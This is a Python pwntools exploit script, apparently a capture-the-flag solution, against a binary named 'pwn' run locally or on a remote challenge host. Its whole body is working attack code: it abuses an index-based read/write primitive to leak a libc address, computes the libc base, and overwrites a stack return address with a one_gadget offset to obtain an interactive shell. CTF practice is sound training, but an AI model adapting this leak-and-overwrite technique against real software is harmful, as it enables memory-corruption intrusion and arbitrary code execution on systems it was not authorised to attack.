#!/usr/bin/env python
# coding=utf-8
from pwn import *
local = 1
if local:
    a=process("./pwn")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com","57856")
    libc=ELF("./libc6_2.23-0ubuntu10_amd64.so")
def init():
    a.recvuntil("input your name \nname:")
    a.sendline("zzz")
def my_read(index1,index2,value):
    addr=""
    for i in range(index1,index2):
        a.recvuntil("input index\n")
        a.sendline(str(i))
        a.recvuntil("now value(hex) ")
        gg=a.recvuntil("\n",drop=True)
        temp=int(gg,16)
        if temp<255 and temp>=0:
            addr+=chr(temp)
        else:
            addr+=chr(int(gg[-2:],16))
        a.recvuntil("input new value\n")
        a.sendline(str(value))
    return addr
def my_write(index1,index2,value):
    addr=""
    p=p64(value)
    index=0
    for i in range(index1,index2):
        a.recvuntil("input index\n")
        a.sendline(str(i))
        a.recvuntil("now value(hex) ")
        pp=a.recvuntil("\n",drop=True)
        temp=int(pp,16)
        if temp<255 and temp>=0:
            addr+=chr(temp)
        else:
            addr+=chr(int(pp[-2:],16))
        a.recvuntil("input new value\n")
        a.sendline(str(ord(p[index])))
        index+=1
    return addr

init()
libc_base=u64(my_read(0x278,0x278+8,0))-240-libc.symbols["__libc_start_main"]
success("libc_base ==> 0x%x"%libc_base)
one_gadget=libc_base+0x45216
#修改返回地址：
my_write(0x158,0x158+8,one_gadget)
a.interactive()